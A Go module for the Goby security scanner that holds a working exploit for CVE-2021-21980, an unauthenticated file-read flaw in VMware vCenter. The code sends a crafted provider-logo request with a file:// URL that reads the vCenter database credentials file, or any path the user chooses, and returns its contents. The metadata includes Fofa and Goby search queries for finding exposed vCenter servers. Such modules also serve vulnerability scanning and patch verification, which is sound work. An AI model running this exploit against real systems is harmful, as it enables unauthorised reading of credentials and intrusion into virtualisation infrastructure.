package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "VMware vCenter provider-logo file reading vulnerability (CVE-2021-21980)",
    "Description": "<p>VMware vCenter Server is a suite of server and virtualization management software from VMware Inc. that provides a centralized platform for managing VMware vSphere environments, automating the implementation and delivery of virtual infrastructure.</p><p>An unauthorized arbitrary file reading vulnerability exists in VMware vCenter 7.0.2.00100 and earlier versions. An attacker can exploit the vulnerability to obtain sensitive information about the service.</p>",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0027.html\">https://www.vmware.com/security/advisories/VMSA-2021-0027.html</a></p>",
    "Product": "vmware-vCenter",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "VMware vCenter provider-logo 文件读取漏洞（CVE-2021-21980）",
            "Product": "vmware-vCenter",
            "Description": "<p>VMware vCenter Server 是 VMware 公司的一套服务器和虚拟化管理软件，该软件提供了一个用于管理 VMware vSphere 环境的集中式平台，可自动实施和交付虚拟基础架构。</p><p>VMware vCenter 7.0.2.00100 及之前版本存在未授权的任意文件读取漏洞，攻击者可利用漏洞获取服务敏感信息。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0027.html\">https://www.vmware.com/security/advisories/VMSA-2021-0027.html</a></p>",
            "Impact": "<p>攻击者可以利用该漏洞读取重要的系统文件（如数据库配置文件、系统配置文件）、数据库配置文件等，使得网站不安全。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "VMware vCenter provider-logo file reading vulnerability (CVE-2021-21980)",
            "Product": "vmware-vCenter",
            "Description": "<p>VMware vCenter Server is a suite of server and virtualization management software from VMware Inc. that provides a centralized platform for managing VMware vSphere environments, automating the implementation and delivery of virtual infrastructure.</p><p>An unauthorized arbitrary file reading vulnerability exists in VMware vCenter 7.0.2.00100 and earlier versions. An attacker can exploit the vulnerability to obtain sensitive information about the service.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.vmware.com/security/advisories/VMSA-2021-0027.html\">https://www.vmware.com/security/advisories/VMSA-2021-0027.html</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"content=\\\"VMware VirtualCenter\" || body=\"content=\\\"VMware vSphere\" || title=\"vSphere Web Client\" || banner=\"vSphere Management \" || cert=\"Issuer: cn=CA, dc=vsphere\" || body=\"url=vcops-vsphere/\" || body=\"The vShield Manager requires\" || title=\"ID_VC_Welcome\"",
    "GobyQuery": "body=\"content=\\\"VMware VirtualCenter\" || body=\"content=\\\"VMware vSphere\" || title=\"vSphere Web Client\" || banner=\"vSphere Management \" || cert=\"Issuer: cn=CA, dc=vsphere\" || body=\"url=vcops-vsphere/\" || body=\"The vShield Manager requires\" || title=\"ID_VC_Welcome\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.vmware.com/",
    "DisclosureDate": "2021-11-24",
    "References": [
        "https://www.vmware.com/security/advisories/VMSA-2021-0027.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.8",
    "CVEIDs": [
        "CVE-2021-21980"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-2027"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "database,custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/vmware-vpx/vcdb.properties",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.5",
    "PostTime": "2023-09-18",
    "PocId": "10239"
}`

	sendPayloada0b8ab62 := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file://" + filePath)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPayloada0b8ab62(u, "/etc/vmware-vpx/vcdb.properties")
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "jdbc:postgresql")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			filePath := goutils.B2S(ss.Params["filePath"])
			if attackType == "database" {
				filePath = `/etc/vmware-vpx/vcdb.properties`
			}
			rsp, err := sendPayloada0b8ab62(expResult.HostInfo, filePath)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else if rsp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = rsp.Utf8Html
			}
			return expResult
		},
	))
}
